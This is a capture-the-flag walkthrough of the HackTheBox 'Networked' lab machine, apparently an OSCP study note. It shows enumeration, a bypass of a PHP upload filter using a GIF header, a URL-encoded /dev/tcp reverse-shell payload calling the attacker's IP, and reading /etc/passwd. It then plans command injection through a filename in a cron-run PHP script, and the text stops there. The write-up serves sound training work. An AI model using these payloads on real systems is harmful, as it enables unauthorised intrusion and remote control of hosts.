---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Networked?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured: yes
aliases:
---

---
# Information / Description

![](../../0.%20Assets/Networked-1789044249469.webp)

---

# Walkthrough


# Foothold

We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again

Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

Once we have the ports, we will do another `nmap` going more in detail


```
nmap -sS -p 22,80 --min-rate 5000 -Pn -n -sVC -oN results.txt -v $T
```

And we basically discover a `apache webserver`, let's see what is in there

![](../../0.%20Assets/Networked-1789055828642.webp)

Okay not much let's do some directory enumeration (`robots.txt` and `sitemap.xml` where not found)

```
┌─[bl1nk㉿kali]─[~/engagements/networked]─[󰦝 10.10.15.150]─[ 10.129.129.76]
└─❯ gobuster dir -u http://$T/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 50                                               󰅗 130
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.129.76/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
uploads              (Status: 301) [Size: 237] [--> http://10.129.129.76/uploads/]
backup               (Status: 301) [Size: 236] [--> http://10.129.129.76/backup/]
```

We find `backup` and `uploads`

![](../../0.%20Assets/Networked-1789055888692.webp)

Let's get that backup file and see what is inside:

```
tar -xf backup.tar
```


![](../../0.%20Assets/Networked-1789055933685.webp)

Okay, could this be new pages we couldn't find with gobuster? let's see

![](../../0.%20Assets/Networked-1789055964135.webp)

Bingo!

I opened the `php` file before uploading anything and there seems to be a filter, also there is another file called `lib.php` that is needed, so let's inspect that file as well.

![](../../0.%20Assets/Networked-1789056000160.webp)

![](../../0.%20Assets/Networked-1789056144018.webp)

So it seems like not only there is a filter, but there is a MIME function checking the file contents and not only the extension of the file, let's first see if this is true by uploading a default `php` file

![](../../0.%20Assets/Networked-1789056259856.webp)

As we can see that function is being called which checks the MIME type let's dig a bit deeper

![](../../0.%20Assets/Networked-1789056343086.webp)

Cool, we know this is working, so let's try bypassing it. Let's open `Burpsuite` and figure this out.

Let's add at the start of the PHP shell the `signature for a GIF` file and change the `content-type` and a simple bypass for the name

```
GIF89a;
```

![](../../0.%20Assets/Networked-1789056563762.webp)

Nice, let's see if this worked, we need to find the gallery first.
- Luckily I remembered to check the files in the backup

![](../../0.%20Assets/Networked-1789056653670.webp)

And we can see our file there, let's open it

![](../../0.%20Assets/Networked-1789056708125.webp)


![](../../0.%20Assets/Networked-1789056728647.webp)

Great! Let's leverage this `RCE` into a reverse shell.

I like using this website to generate reverse shells: [revshells.com](https://www.revshells.com/)

And this is the output i came up with (remember to `URL encode`)

```
%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.150%2F1337%200%3E%261
```

so let's start a listener 

```
rlwrap nc -lvnp 1337
```

and from the `RCE` run our reverse shell payload

Add this to the end of the URL
```
?cmd=%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.150%2F1337%200%3E%261
```

![](../../0.%20Assets/Networked-1789056913937.webp)

Nice, we are the user `Apache`

Let's open a interactive shell with python, in this case the machine has `python` and not `python3` (`which python` to see that) so we will use the following command

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Let's see if we can find the `user.txt` 

```
bash-4.2$ cd
cd
bash: cd: HOME not set
bash-4.2$
```

Seems like we need to pivot to another user before we get the flag.

let's find the users in the box by inspecting the `/etc/passwd` file

```
cat /etc/passwd | grep -i "/bin/bash"
root:x:0:0:root:/root:/bin/bash
guly:x:1000:1000:guly:/home/guly:/bin/bash
```

I filtered the output to only show the users with a real termnial.

Seems like we need to find a way of converting to the user `guly`

![](../../0.%20Assets/Networked-1789057782710.webp)

I moved into his home directory and the flag is there but we can't see it and there is a crontab file that runs every 3 minutes and a php file

![](../../0.%20Assets/Networked-1789057866414.webp)

the PHP script is vulnerable to command execution if I’m able to control what files are placed in the /var/www/html/uploads/ directory:
![](../../0.%20Assets/Networked-1789058642681.webp)

```
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```


This is because there is no filter, it takes de input (filename) and deletes it, but what if we do some command injection like so

```
'fake_file; reverse shell' -> file name 
```


